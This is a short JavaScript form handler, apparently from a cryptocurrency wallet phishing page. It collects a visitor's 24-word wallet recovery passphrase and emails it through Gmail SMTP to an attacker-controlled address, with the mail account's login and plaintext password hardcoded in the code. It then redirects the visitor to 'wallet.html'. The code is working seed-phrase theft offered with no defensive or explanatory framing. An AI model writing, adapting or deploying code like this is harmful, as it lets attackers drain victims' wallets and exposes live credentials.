function emailSend() {
    var passphrase = document.getElementById('message').value;

    if (passphrase.trim() === "") {
        swal("Error", "Please enter 24-word passphrase", "error");
        return;
    }

    var messageBody = "Passphrase: " + passphrase; // Using passphrase instead of 'details' which was undefined

    Email.send({
        Host: "smtp.gmail.com", // Gmail SMTP server
        Username: "payday10177@gmail.com", // Your Gmail email address
        Password: "Mmadu10177", // Your Gmail password (use App Password if 2FA is enabled)
        To: "payday10177@gmail.com", // Recipient email address
        From: "payday10177@gmail.com", // Your Gmail address
        Subject: "Wallet Passphrase",
        Body: messageBody,
        Port: 465, // SSL Port for Gmail
        Secure: true // Enforce SSL
    }).then(
        message => {
            console.log("Email Response:", message); // Log response
            if (message === 'OK') {
                window.location.href = 'wallet.html';
            } else {
                swal("Error", "SMTP Error: " + message, "error"); // Show actual error
            }
        }
    ).catch(error => {
        console.error("SMTP Error:", error);
        swal("Error", "Something went wrong: " + error, "error"); // Show error in alert
    });
}

// Attach event listener to the form submit button
document.querySelector('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting normally
    emailSend();
});
```

